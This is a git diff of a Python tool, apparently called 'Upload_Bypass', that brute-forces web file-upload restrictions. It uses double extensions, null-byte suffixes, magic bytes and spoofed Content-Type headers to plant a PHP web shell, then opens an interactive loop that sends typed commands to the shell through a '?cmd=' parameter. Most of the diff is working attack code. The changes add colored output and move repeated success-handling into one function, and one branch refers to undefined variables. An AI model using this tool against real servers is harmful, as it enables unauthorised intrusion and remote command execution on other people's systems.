@@ -6,16 +6,42 @@
 
 import requests
 import optparse
+import os
 import sys
 import json
 import urllib
+import platform
 from urllib.parse import urlparse
 import bs4 as bs
 import requests.cookies
 import pickle
+import termcolor
+import colorama
 from requests_html import HTMLSession
 from requests.auth import HTTPDigestAuth
 from requests.auth import HTTPBasicAuth
+
+
+def banner():
+    banner = """
+ * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * 
+*                                                                                                                          *
+*                                                                                                                          *
+*         ██    ██ ██████  ██       ██████   █████  ██████        ██████  ██    ██ ██████   █████  ███████ ███████         *  
+*         ██    ██ ██   ██ ██      ██    ██ ██   ██ ██   ██       ██   ██  ██  ██  ██   ██ ██   ██ ██      ██              *  
+*         ██    ██ ██████  ██      ██    ██ ███████ ██   ██ █████ ██████    ████   ██████  ███████ ███████ ███████         *  
+*         ██    ██ ██      ██      ██    ██ ██   ██ ██   ██       ██   ██    ██    ██      ██   ██      ██      ██         *  
+*          ██████  ██      ███████  ██████  ██   ██ ██████        ██████     ██    ██      ██   ██ ███████ ███████         *  
+*                                                                                                                          *
+*                                                                                                                          *
+*          Tool for bypassing upload restriction by different bug bounty techniques                                        *    
+*          Coded by: Sagiv                                                                                                 *        
+*          github: https://github.com/sAjibuu                                                                              *  
+*                                                                                                                          *
+*                                                                                                                          *
+ * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * 
+    """
+    print(termcolor.colored(banner, 'yellow'))
 
 
 def save_cookies(session, filename):
@@ -36,6 +62,75 @@ def load_cookies(session, filename):
                 fancy.write(str(cookies))
         else:
             return False
+
+
+def success(success, response, url, filename_ext, counter, brute_force, location, session, headers, proxies, tls):
+    if success in response.text:
+
+        print(termcolor.colored(f"[+] try {counter} with: {filename_ext}", 'green'))
+
+        if location != 'optional':
+
+            print(termcolor.colored(f"[*] File uploaded successfully with: {filename_ext}", 'yellow'))
+            domain = urlparse(url).netloc
+
+            if 'http://' in url:
+                print(
+                    termcolor.colored(
+                        f"[*] You can access the uploaded file on: http://{domain}{location}{filename_ext}?cmd=command",
+                        'yellow'))
+            else:
+                print(
+                    termcolor.colored(
+                        f"[*] You can access the uploaded file on: https://{domain}{location}{filename_ext}?cmd=command",
+                        'yellow'))
+
+            print(termcolor.colored("[*] Results saved in results.txt", 'yellow'))
+            f = open("results.txt", "a")
+            f.write(f"File uploaded successfully with: {filename_ext}\n")
+            f.close()
+
+            while True:
+                try:
+                    command = input(termcolor.colored("└─$ ", 'green'))
+                    cmd_encoded = urllib.parse.quote(command)
+                    domain = urlparse(url).netloc
+
+                    if 'http://' in url:
+                        final_url = f"http://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
+                    else:
+                        final_url = f"https://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
+
+                    response = session.get(final_url, headers=headers, allow_redirects=False,
+                                           proxies=proxies, verify=tls)
+
+                    print(termcolor.colored(f"URL: {final_url}", 'blue'))
+                    print(response.text)
+
+                except KeyboardInterrupt:
+                    print(termcolor.colored("\nkeyboardinterrupt exception is caught!", 'red'))
+
+                    if brute_force:
+                        return True
+
+                    else:
+                        sys.exit(1)
+
+        else:
+            print(termcolor.colored(f"[*] File uploaded successfully with: {filename_ext}", 'yellow'))
+            print(termcolor.colored(f"[*] You can access the uploaded file: {filename_ext}?cmd=command", 'yellow'))
+            print(termcolor.colored("[*] Results saved in results.txt", 'yellow'))
+            f = open("results.txt", "a")
+            f.write(f"File uploaded successfully with: {filename_ext}\n")
+            f.close()
+
+            if brute_force:
+                return True
+
+            else:
+                sys.exit(1)
+    else:
+        print(termcolor.colored(f"[-] Try {counter} with: {filename_ext}", 'red'))
 
 
 def auth(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity, location, username,
@@ -76,7 +171,7 @@ def auth(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_forc
                 }
 
                 if data == {}:
-                    print("Server responded with an empty page!")
+                    print(termcolor.colored("Server responded with an empty page!", 'red'))
                     sys.exit(1)
 
             response = session.post(URL, allow_redirects=True)
@@ -90,13 +185,13 @@ def auth(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_forc
                     f.write(f"first, {session.cookies.get_dict()}")
 
                 load_cookies(session, "cookies.txt")
-                print("[*] Authentication worked!")
+                print(termcolor.colored("[*] Authentication worked!", 'green'))
                 attributes(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity,
                            location,
                            session)
 
             else:
-                print("[-] Username or password is incorrect!")
+                print(termcolor.colored("[-] Username or password is incorrect!", 'red'))
                 sys.exit(1)
 
         else:
@@ -106,7 +201,7 @@ def auth(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_forc
             response = session.get(URL, auth=basic)
 
             if response.text != "" and response.status_code == 200 or response.text == 302:
-                print("[*] Authentication worked!")
+                print(termcolor.colored("[*] Authentication worked!", 'green'))
                 save_cookies(session, "cookies.txt")
                 load_cookies(session, "cookies.txt")
                 attributes(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity,
@@ -114,14 +209,14 @@ def auth(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_forc
                            session)
 
             elif response.status_code == 404:
-                print("[-] Server responded with 404!")
+                print(termcolor.colored("[-] Server responded with 404!", 'red'))
                 sys.exit(1)
 
             else:
                 # Digest Authentication
                 response = session.get(URL, auth=HTTPDigestAuth(username, password))
                 if response.text != "" and response.status_code == 200 or response.text == 302:
-                    print("[*] Authentication worked!")
+                    print(termcolor.colored("[*] Authentication worked!", 'green'))
                     save_cookies(session, "cookies.txt")
                     load_cookies(session, "cookies.txt")
                     attributes(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity,
@@ -129,11 +224,11 @@ def auth(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_forc
                                session)
 
                 elif response.status_code == 404:
-                    print("[-] Server responded with 404!")
+                    print(termcolor.colored("[-] Server responded with 404!", 'red'))
                     sys.exit(1)
 
                 else:
-                    print("[-] Username or password is incorrect!")
+                    print(termcolor.colored("[-] Username or password is incorrect!", 'red'))
                     sys.exit(1)
 
     except requests.exceptions.RequestException as error:
@@ -342,7 +437,7 @@ def attributes(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brut
                 URL = "https://" + domain + action
 
     else:
-        print("[-] Couldn't upload files, please check if the url is correct!")
+        print(termcolor.colored("[-] Couldn't upload files, please check if the url is correct!", 'red'))
         sys.exit(1)
 
     file_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity, location,
@@ -371,8 +466,6 @@ def file_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, 
 
         counter = 0
 
-        print("[-] Trying different file extensions. Please be patient!")
-
         for ext in eval(EXTENSION):
 
             counter += 1
@@ -386,69 +479,14 @@ def file_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, 
             response = session.post(URL, files=files, headers=headers, data=data, proxies=proxies,
                                     allow_redirects=False, verify=TLS)
 
-            print(f"[-] Trying differet {EXTENSION} extensions!")
-            print(f"[-] Try {counter} with: {filename_ext}")
-
             if verbosity:
                 print(response.text)
 
-            if SUCCESS in response.text:
+            brute = success(SUCCESS, response, URL, filename_ext, counter, brute_force, location, session, headers,
+                            proxies, TLS)
 
-                if location != 'optional':
-
-                    print(f"[*] File uploaded successfully with: {filename_ext}")
-                    domain = urlparse(URL).netloc
-
-                    if 'http://' in URL:
-                        print(
-                            f"[*] You can access the uploaded file on: http://{domain}{location}{filename_ext}?cmd=command")
-
-                    else:
-                        print(
-                            f"[*] You can access the uploaded file on: https://{domain}{location}{filename_ext}?cmd=command")
-
-                    print("[*] Saved in results.txt")
-                    f = open("results.txt", "a")
-                    f.write(f"File uploaded successfully with: {filename_ext}\n")
-                    f.close()
-
-                    while True:
-                        try:
-                            command = input("└─$ ")
-                            cmd_encoded = urllib.parse.quote(command)
-                            domain = urlparse(URL).netloc
-
-                            if 'http://' in URL:
-                                final_url = f"http://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
-
-                            else:
-                                final_url = f"https://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
-
-                            response = session.get(final_url, allow_redirects=False, headers=headers, data=data,
-                                                   proxies=proxies, verify=TLS)
-                            print(f"URL is: {final_url}")
-                            print(response.text)
-
-                        except KeyboardInterrupt:
-                            print("\nKeyboardInterrupt exception is caught!")
-                            break
-
-                else:
-                    print(f"[*] File uploaded successfully with: {filename_ext}")
-                    print(f"[*] You can access the uploaded file: {filename_ext}?cmd=command")
-                    print("[*] Saved in results.txt")
-                    f = open("results.txt", "a")
-                    f.write(f"File uploaded successfully with: {filename_ext}\n")
-                    f.close()
-
-                if verbosity:
-                    print(response.text)
-
-                if brute_force:
-                    break
-
-                else:
-                    sys.exit(1)
+            if brute:
+                break
 
     except requests.exceptions.RequestException as error:
         raise SystemExit(error)
@@ -474,9 +512,10 @@ def double_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, counter, proxies, TLS
     perl = [".pl", ".cgi", ".pL", ".cGi"]
     null = ["%20", "%0a", "%00", "%0d%0a", "/", ".\\", ".", "...."]
 
+    print(termcolor.colored("[-] Trying Doubling PHP extensions technique!", 'magenta'))
+
     for ext in eval(EXTENSION):
 
-        print("[-] Trying Doubling PHP extensions!")
         counter += 1
 
         filename = f'shell.{EXTENSION}'
@@ -492,67 +531,14 @@ def double_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, counter, proxies, TLS
             "User-Agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"},
                                 proxies=proxies, verify=TLS)
 
-        print(f"[-] Try {counter} with: {filename_ext}")
-
         if verbosity:
             print(response.text)
 
-        if SUCCESS in response.text:
+        brute = success(SUCCESS, response, URL, filename_ext, counter, brute_force, location, session, headers, proxies,
+                        TLS)
 
-            if location != 'optional':
-
-                print(f"[*] File uploaded successfully with: {filename_ext}")
-                domain = urlparse(URL).netloc
-
-                if 'http://' in URL:
-                    print(
-                        f"[*] You can access the uploaded file on: http://{domain}{location}{filename_ext}?cmd=command")
-
-                else:
-                    print(
-                        f"[*] You can access the uploaded file on: https://{domain}{location}{filename_ext}?cmd=command")
-
-                print("[*] Saved in results.txt")
-                f = open("results.txt", "a")
-                f.write(f"File uploaded successfully with: {filename_ext}\n")
-                f.close()
-
-                while True:
-                    try:
-                        command = input("└─$ ")
-                        cmd_encoded = urllib.parse.quote(command)
-                        domain = urlparse(URL).netloc
-
-                        if 'http://' in URL:
-                            final_url = f"http://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
-                        else:
-                            final_url = f"https://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
-
-                        response = session.get(final_url, headers=headers, data=data,
-                                               proxies=proxies, verify=TLS)
-                        print(f"URL is: {final_url}")
-                        print(response.text)
-
-                    except KeyboardInterrupt:
-                        print("\nKeyboardInterrupt exception is caught!")
-                        break
-
-            else:
-                print(f"[*] File uploaded successfully with: {filename_ext}")
-                print(f"[*] You can access the uploaded file: {filename_ext}?cmd=command")
-                print("[*] Saved in results.txt")
-                f = open("results.txt", "a")
-                f.write(f"File uploaded successfully with: {filename_ext}\n")
-                f.close()
-
-            if verbosity:
-                print(response.text)
-
-            if brute_force:
-                break
-
-            else:
-                sys.exit(1)
+        if brute:
+            break
 
     null_bytes(EXTENSION, URL, ALLOWED_EXT, counter, SUCCESS, proxies, TLS, headers, brute_force, verbosity, location,
                session, file_attr, data)
@@ -575,13 +561,13 @@ def null_bytes(EXTENSION, URL, ALLOWED_EXT, counter, SUCCESS, proxies, TLS, head
     perl = [".pl", ".cgi", ".pL", ".cGi"]
     null = ["%20", "%0a", "%00", "%0d%0a", "/", ".\\", ".", "...."]
 
+    print(termcolor.colored(f"[-] Trying null bytes at the end of the {EXTENSION} extensions technique!", 'magenta'))
+
     for ext in eval(EXTENSION):
 
         for byte in null:
 
             counter += 1
-
-            print(f"[-] Trying null bytes at the end of the {EXTENSION} extensions!")
             filename = 'shell.php'
             filename_ext = filename.replace("shell.php", f"shell{ext}{byte}")
             files = {
@@ -592,67 +578,14 @@ def null_bytes(EXTENSION, URL, ALLOWED_EXT, counter, SUCCESS, proxies, TLS, head
             response = session.post(URL, files=files, allow_redirects=False, headers=headers, data=data,
                                     proxies=proxies, verify=TLS)
 
-            print(f"[-] Try {counter} with: {filename_ext}")
-
             if verbosity:
                 print(response.text)
 
-            if SUCCESS in response.text:
+            brute = success(SUCCESS, response, URL, filename_ext, counter, brute_force, location, session, headers,
+                            proxies, TLS)
 
-                if location != 'optional':
-
-                    print(f"[*] File uploaded successfully with: {filename_ext}")
-                    domain = urlparse(URL).netloc
-
-                    if 'http://' in URL:
-                        print(
-                            f"[*] You can access the uploaded file on: http://{domain}{location}{filename_ext}?cmd=command")
-
-                    else:
-                        print(
-                            f"[*] You can access the uploaded file on: https://{domain}{location}{filename_ext}?cmd=command")
-
-                    print("[*] Saved in results.txt")
-                    f = open("results.txt", "a")
-                    f.write(f"File uploaded successfully with: {filename_ext}\n")
-                    f.close()
-
-                    while True:
-                        try:
-                            command = input("└─$ ")
-                            cmd_encoded = urllib.parse.quote(command)
-                            domain = urlparse(URL).netloc
-
-                            if 'http://' in URL:
-                                final_url = f"http://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
-                            else:
-                                final_url = f"https://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
-
-                            response = session.get(final_url, allow_redirects=False, headers=headers,
-                                                   proxies=proxies, verify=TLS)
-                            print(f"URL is: {final_url}")
-                            print(response.text)
-
-                        except KeyboardInterrupt:
-                            print("\nKeyboardInterrupt exception is caught!")
-                            break
-
-                else:
-                    print(f"[*] File uploaded successfully with: {filename_ext}")
-                    print(f"[*] You can access the uploaded file: {filename_ext}?cmd=command")
-                    print("[*] Saved in results.txt")
-                    f = open("results.txt", "a")
-                    f.write(f"File uploaded successfully with: {filename_ext}\n")
-                    f.close()
-
-                if verbosity:
-                    print(response.text)
-
-                if brute_force:
-                    break
-
-                else:
-                    sys.exit(1)
+            if brute:
+                break
 
     temp_extension = ALLOWED_EXT
 
@@ -688,19 +621,17 @@ def magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, 
     perl = [".pl", ".cgi", ".pL", ".cGi"]
     null = ["%20", "%0a", "%00", "%0d%0a", "/", ".\\", ".", "...."]
 
+    print(termcolor.colored(f"[-] Trying valid {valid} extension before PHP extension with Magic bytes technique!",
+                            'magenta'))
+
     for ext in eval(EXTENSION):  # trying to upload malicious picture with image extensions and their magic bytes
 
         if valid == 'jpeg' or valid == 'jpg' or valid == 'png' and EXTENSION == 'php':
-
-            print(
-                f"[-] Trying valid {valid} extension before PHP extension with Magic bytes. Please be patient!")
 
             counter += 1
 
             filename = f'shell.{valid}.php'
             filename_ext = filename.replace(F".php", f"{ext}")
-
-            print(f"[-] Try {counter} with: {filename_ext}")
 
             files = {
                 f'{file_attr}': (filename_ext, open(filename, 'rb'), 'image/jpeg'),
@@ -713,72 +644,21 @@ def magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, 
             if verbosity:
                 print(response.text)
 
-            success = str(SUCCESS)
+            brute = success(SUCCESS, response, URL, filename_ext, counter, brute_force, location, session, headers,
+                            proxies, TLS)
 
-            if success in response.text:
+            if brute:
+                break
 
-                if location != 'optional':
-
-                    print(f"[*] File uploaded successfully with: {filename_ext}")
-                    domain = urlparse(URL).netloc
-
-                    if 'http://' in URL:
-                        print(
-                            f"[*] You can access the uploaded file on: http://{domain}{location}{filename_ext}?cmd=command")
-
-                    else:
-                        print(
-                            f"[*] You can access the uploaded file on: https://{domain}{location}{filename_ext}?cmd=command")
-
-                    print("[*] Saved in results.txt")
-                    f = open("results.txt", "a")
-                    f.write(f"File uploaded successfully with: {filename_ext}\n")
-                    f.close()
-
-                    while True:
-                        try:
-                            command = input("└─$ ")
-                            cmd_encoded = urllib.parse.quote(command)
-                            domain = urlparse(URL).netloc
-
-                            if 'http://' in URL:
-                                final_url = f"http://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
-                            else:
-                                final_url = f"https://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
-
-                            response = session.get(final_url, headers=headers, allow_redirects=False,
-                                                   proxies=proxies, verify=TLS)
-                            print(f"URL is: {final_url}")
-                            print(response.text)
-
-                        except KeyboardInterrupt:
-                            print("\nKeyboardInterrupt exception is caught!")
-                            break
-
-                else:
-                    print(f"[*] File uploaded successfully with: {filename_ext}")
-                    print(f"[*] You can access the uploaded file: {filename_ext}?cmd=command")
-                    print("[*] Saved in results.txt")
-                    f = open("results.txt", "a")
-                    f.write(f"File uploaded successfully with: {filename_ext}\n")
-                    f.close()
-
-                if brute_force:
-                    break
-                else:
-                    sys.exit()
+    print(termcolor.colored(f"[-] Trying valid {valid} extension after {EXTENSION} with Magic bytes technique!",
+                            'magenta'))
 
     for ext in eval(EXTENSION):  # Same loop but checking valid upload extension after server extension!
 
         if valid == 'jpeg' or valid == 'jpg' or valid == 'png' and EXTENSION == 'php':
 
-            print(
-                f"[-] Trying valid {valid} extension after {EXTENSION} with Magic bytes. Please be patient!")
-
             filename = f'shell.php.{valid}'
             filename_ext = filename.replace(".php", f"{ext}")
-
-            print(f"[-] Try {counter} with: {filename_ext}")
 
             files = {
                 f'{file_attr}': (filename_ext, open(filename, 'rb'), 'image/jpeg'),
@@ -791,62 +671,11 @@ def magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, 
             if verbosity:
                 print(response.text)
 
-            if SUCCESS in response.text:
+            brute = success(SUCCESS, response, URL, filename_ext, counter, brute_force, location, session, headers,
+                            proxies, TLS)
 
-                if location != 'optional':
-
-                    print(f"[*] File uploaded successfully with: {filename_ext}")
-                    domain = urlparse(URL).netloc
-
-                    if 'http://' in URL:
-                        print(
-                            f"[*] You can access the uploaded file on: http://{domain}{location}{filename_ext}?cmd=command")
-
-                    else:
-                        print(
-                            f"[*] You can access the uploaded file on: https://{domain}{location}{filename_ext}?cmd=command")
-
-                    print("[*] Saved in results.txt")
-                    f = open("results.txt", "a")
-                    f.write(f"File uploaded successfully with: {filename_ext}\n")
-                    f.close()
-
-                    while True:
-                        try:
-                            command = input("└─$ ")
-                            cmd_encoded = urllib.parse.quote(command)
-                            domain = urlparse(URL).netloc
-
-                            if 'http://' in URL:
-                                final_url = f"http://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
-                            else:
-                                final_url = f"https://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
-
-                            response = session.get(final_url, headers=headers, allow_redirects=False,
-                                                   proxies=proxies, verify=TLS)
-                            print(f"URL is: {final_url}")
-                            print(response.text)
-
-                        except KeyboardInterrupt:
-                            print("\nKeyboardInterrupt exception is caught!")
-                            break
-
-                else:
-                    print(f"[*] File uploaded successfully with: {filename_ext}")
-                    print(f"[*] You can access the uploaded file: {filename_ext}?cmd=command")
-                    print("[*] Saved in results.txt")
-                    f = open("results.txt", "a")
-                    f.write(f"File uploaded successfully with: {filename_ext}\n")
-                    f.close()
-
-                if verbosity:
-                    print(response.text)
-
-                if brute_force:
-                    break
-
-                else:
-                    sys.exit()
+            if brute:
+                break
 
     content_type(URL, SUCCESS, EXTENSION, counter, proxies, TLS, headers, brute_force, verbosity, location, session,
                  file_attr, data)
@@ -856,15 +685,13 @@ def content_type(URL, SUCCESS, EXTENSION, counter, proxies, TLS, headers, brute_
                  file_attr, data):
     # Trying different content types
 
-    print("[-] Trying different content-type headers. Please be patient!")
+    print(termcolor.colored("[-] Trying different content-type headers technique!", 'magenta'))
 
     with open("./content-type.txt", encoding='latin-1') as file:
 
         for line in file:
             wordlist = line.rstrip()
             counter += 1
-
-            print(f"[-] Try {counter} with Content-Type: {wordlist}")
 
             files = {
                 f'{file_attr}': (f'shell.{EXTENSION}', open(f'shell.{EXTENSION}', 'rb'), wordlist),
@@ -877,72 +704,82 @@ def content_type(URL, SUCCESS, EXTENSION, counter, proxies, TLS, headers, brute_
             if verbosity:
                 print(response.text)
 
-            if SUCCESS in response.text:
+            if success in response.text:
+
+                print(termcolor.colored(f"[+] try {counter} with: {wordlist}", 'green'))
 
                 if location != 'optional':
 
-                    print(f"[*] File uploaded successfully with Content-Type: {wordlist}")
-                    domain = urlparse(URL).netloc
+                    print(termcolor.colored(f"[*] File uploaded successfully with Content-Type header: {wordlist}",
+                                            'yellow'))
+                    domain = urlparse(url).netloc
 
-                    if 'http://' in URL:
-
+                    if 'http://' in url:
                         print(
-                            f"[*] You can access the uploaded file on: http://{domain}{location}shell.{EXTENSION}?cmd=command")
-
+                            termcolor.colored(
+                                f"[*] You can access the uploaded file on: http://{domain}{location}shell.{EXTENSION}?cmd=command",
+                                'yellow'))
                     else:
                         print(
-                            f"[*] You can access the uploaded file on: https://{domain}{location}shell.{EXTENSION}?cmd=command")
+                            termcolor.colored(
+                                f"[*] You can access the uploaded file on: https://{domain}{location}shell.{EXTENSION}?cmd=command",
+                                'yellow'))
 
-                    print("[*] Saved in results.txt")
+                    print(termcolor.colored("[*] Results saved in results.txt", 'yellow'))
                     f = open("results.txt", "a")
+                    f.write(f"File uploaded successfully with: shell.{EXTENSION} and Content-Type: {wordlist}\n")
                     f.close()
 
                     while True:
                         try:
-                            command = input("└─$ ")
+                            command = input(termcolor.colored("└─$ ", 'green'))
                             cmd_encoded = urllib.parse.quote(command)
-                            domain = urlparse(URL).netloc
+                            domain = urlparse(url).netloc
 
-                            if 'http://' in URL:
-
+                            if 'http://' in url:
                                 final_url = f"http://{domain}{location}shell.{EXTENSION}?cmd={cmd_encoded}"
-
                             else:
                                 final_url = f"https://{domain}{location}shell.{EXTENSION}?cmd={cmd_encoded}"
 
-                            response = session.get(final_url, allow_redirects=False, headers=headers, data=data,
-                                                   proxies=proxies,
-                                                   verify=TLS)
-                            print(f"URL is: {final_url}")
+                            response = session.get(final_url, headers=headers, allow_redirects=False,
+                                                   proxies=proxies, verify=tls)
+
+                            print(termcolor.colored(f"URL: {final_url}", 'blue'))
                             print(response.text)
 
                         except KeyboardInterrupt:
-                            print("\nKeyboardInterrupt exception is caught!")
-                            break
+                            print(termcolor.colored("\nkeyboardinterrupt exception is caught!", 'red'))
+
+                            if brute_force:
+                                break
+
+                            else:
+                                sys.exit(1)
 
                 else:
-                    print(f"[*] File uploaded successfully with Content-Type: {wordlist}")
-                    print("[*] Saved in results.txt")
+                    print(termcolor.colored(f"[*] File uploaded successfully with: shell.{EXTENSION}", 'yellow'))
+                    print(termcolor.colored(f"[*] You can access the uploaded file: shell.{EXTENSION}?cmd=command",
+                                            'yellow'))
+                    print(termcolor.colored("[*] Results saved in results.txt", 'yellow'))
                     f = open("results.txt", "a")
-                    f.write(f"[*] File uploaded successfully with Content-Type: {wordlist}")
+                    f.write(f"File uploaded successfully with: shell.{EXTENSION} and Content-Type: {wordlist}\n")
                     f.close()
 
-                if verbosity:
-                    print(response.text)
+                    if brute_force:
+                        break
 
-                if brute_force:
-                    break
+                    else:
+                        sys.exit(1)
+            else:
+                print(termcolor.colored(f"[-] Try {counter} with: {filename_ext}", 'red'))
 
-                else:
-                    sys.exit(1)
-
-    print("If everything fails, check if you need to login first and supply username and password!")
+    print(termcolor.colored("If everything fails, check if you need to login first and supply username and password!",
+                            'red'))
 
 
 def main():
     # Main function with all its arguments parsing
-
-    parser = optparse.OptionParser()
+    parser = optparse.OptionParser(description=banner())
 
     parser.add_option('-u', "--url", dest="url",
                       help="Supply the login page, for example: http://192.168.98.200/login.php'",
@@ -1058,11 +895,12 @@ def main():
         else:
 
             if username != 'optional' and password != 'optional':
-
+                colorama.deinit()
                 auth(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity,
                      location, username, password)
 
             else:
+                colorama.deinit()
                 session = requests.Session()
                 attributes(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity,
                            location,
